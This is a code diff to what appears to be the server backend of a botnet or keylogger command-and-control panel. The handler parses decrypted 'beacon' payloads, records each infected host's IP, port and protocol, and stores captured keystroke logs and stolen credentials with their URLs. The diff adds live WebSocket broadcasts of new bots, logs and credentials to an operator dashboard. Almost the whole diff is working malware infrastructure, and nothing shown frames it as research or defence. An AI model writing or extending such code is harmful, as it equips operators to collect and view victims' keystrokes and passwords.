@@ -78,7 +78,7 @@ class ProtocolHandler(ABC):
         pass
     
     @abstractmethod
-    async def parse(self, decrypted_data: bytes, client_info: Dict[str, Any]) -> Dict[str, Any]:
+    async def parse(self, decrypted_data: bytes) -> Dict[str, Any]:
         """
         Parse decrypted payload into structured data.
         
@@ -87,7 +87,6 @@ class ProtocolHandler(ABC):
         
         Args:
             decrypted_data: Decrypted payload bytes
-            client_info: Dictionary with 'ip' and 'port' of client
             
         Returns:
             Dictionary containing:
@@ -155,8 +154,13 @@ class ProtocolHandler(ABC):
             
             # Parse into structured data
             try:
-                client_info = {"ip": client_ip, "port": client_port}
-                parsed_data = await self.parse(decrypted_data, client_info)
+                parsed_data = await self.parse(decrypted_data)
+                # Add client info to bot_info
+                if "bot_info" not in parsed_data:
+                    parsed_data["bot_info"] = {}
+                parsed_data["bot_info"]["ip_address"] = client_ip
+                parsed_data["bot_info"]["port"] = client_port
+                parsed_data["bot_info"]["protocol"] = self.name
             except Exception as e:
                 logger.error(f"[{self.name}] Parsing failed for {client_ip}: {e}")
                 return
@@ -217,7 +221,7 @@ class ProtocolHandler(ABC):
     
     async def _store_data(self, parsed_data: Dict[str, Any]) -> None:
         """
-        Store parsed data in database.
+        Store parsed data in database and broadcast WebSocket events.
         
         Args:
             parsed_data: Dictionary with bot_info, logs, and credentials
@@ -225,21 +229,36 @@ class ProtocolHandler(ABC):
         from app.models.bot import Bot
         from app.models.credential import Credential
         from app.models.log import Log
+        from app.core.websocket import get_connection_manager
         from sqlalchemy import select
+        
+        manager = get_connection_manager()
         
         async with self.db_session_factory() as session:
             try:
                 # Store or update bot information
                 bot_info = parsed_data.get("bot_info", {})
                 if bot_info:
+                    # Set default location values (no GeoIP lookup)
+                    bot_info.update({
+                        "country": "Unknown Network",
+                        "country_code": "XX",
+                        "city": "Unknown City",
+                        "latitude": "0.0",
+                        "longitude": "0.0",
+                        "continent": None,
+                        "timezone": None,
+                    })
+                    
                     # Check if bot exists
                     result = await session.execute(
                         select(Bot).where(Bot.bot_id == bot_info.get("bot_id"))
                     )
                     bot = result.scalar_one_or_none()
                     
+                    is_new_bot = False
                     if bot:
-                        # Update last_seen
+                        # Update last_seen timestamp
                         bot.last_seen = datetime.utcnow()
                         logger.info(f"Updated existing bot: {bot.bot_id}")
                     else:
@@ -248,20 +267,48 @@ class ProtocolHandler(ABC):
                         session.add(bot)
                         await session.flush()  # Get bot.id
                         logger.info(f"Created new bot: {bot.bot_id}")
+                        is_new_bot = True
                     
                     bot_db_id = bot.id
+                    
+                    # Broadcast new beacon event
+                    if is_new_bot:
+                        await manager.broadcast("new_beacon", {
+                            "bot_id": bot.id,
+                            "ip_address": bot.ip_address,
+                            "protocol": bot.protocol,
+                            "hostname": bot.hostname,
+                            "country": bot.country,
+                            "country_code": bot.country_code
+                        })
                     
                     # Store logs (keystrokes, etc.)
                     for log_entry in parsed_data.get("logs", []):
                         log_entry["bot_id"] = bot_db_id
                         log = Log(**log_entry)
                         session.add(log)
+                        
+                        # Broadcast new log event
+                        await manager.broadcast("new_log", {
+                            "log_id": log.id if hasattr(log, 'id') else None,
+                            "bot_id": bot_db_id,
+                            "log_type": log_entry.get("log_type"),
+                            "preview": str(log_entry.get("keystroke_data", ""))[:100]
+                        })
                     
                     # Store credentials
                     for cred_entry in parsed_data.get("credentials", []):
                         cred_entry["bot_id"] = bot_db_id
                         credential = Credential(**cred_entry)
                         session.add(credential)
+                        
+                        # Broadcast credential event
+                        await manager.broadcast("new_credential", {
+                            "credential_id": credential.id if hasattr(credential, 'id') else None,
+                            "bot_id": bot_db_id,
+                            "cred_type": cred_entry.get("cred_type"),
+                            "url": cred_entry.get("url")
+                        })
                     
                     await session.commit()
                     logger.info(f"Stored {len(parsed_data.get('logs', []))} logs and "
